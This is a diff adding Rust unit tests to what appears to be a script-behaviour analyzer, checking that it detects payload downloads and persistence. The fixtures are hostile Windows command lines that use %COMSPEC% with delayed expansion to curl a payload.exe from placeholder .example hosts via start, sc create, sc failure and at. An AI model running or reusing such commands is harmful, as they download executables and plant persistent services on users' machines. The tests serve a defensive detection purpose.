@@ -19952,6 +19952,23 @@ mod start_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn start_comspec_child_preserves_delayed_expansion() {
+        let script = br#"start "" /b "%COMSPEC%" /V:ON /c "set U=https://start-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://start-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "start COMSPEC child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -49777,6 +49794,33 @@ C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.ex
     }
 
     #[test]
+    fn sc_create_comspec_binpath_cmd_child_is_analyzed() {
+        let script = br#"sc create UpdateSvc binPath= "%COMSPEC% /V:ON /c set U=https://sc-comspec-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("%COMSPEC% /V:ON /c set U=")
+            )),
+            "COMSPEC service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-comspec-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "COMSPEC service binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn remote_sc_create_binpath_cmd_child_is_analyzed() {
         let script = br#"sc \\target.example create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://remote-sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
@@ -49840,6 +49884,35 @@ C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.ex
             report.traits
         );
     }
+
+    #[test]
+    fn sc_failure_comspec_command_child_is_analyzed() {
+        let script = br#"sc failure UpdateSvc command= "%COMSPEC% /V:ON /c set U=https://sc-comspec-failure.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "ServiceFailureCommand"
+                        && key == "UpdateSvc"
+                        && value_name == "command"
+                        && command.contains("%COMSPEC% /V:ON /c set U=")
+            )),
+            "COMSPEC service failure command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-comspec-failure.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "COMSPEC service failure command child was not analyzed: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -49872,6 +49945,35 @@ mod at_scheduler_tests {
                         && dst.as_deref() == Some("payload.exe")
             )),
             "at scheduled child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn at_scheduled_comspec_cmd_child_is_analyzed() {
+        let script = br#"at 23:59 %COMSPEC% /V:ON /c set U=https://at-comspec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "AtJob"
+                        && key == "23:59"
+                        && value_name == "command"
+                        && command.contains("%COMSPEC% /V:ON /c set U=")
+            )),
+            "COMSPEC at scheduled command persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://at-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "COMSPEC at scheduled child command was not analyzed: {:?}",
             report.traits
         );
     }
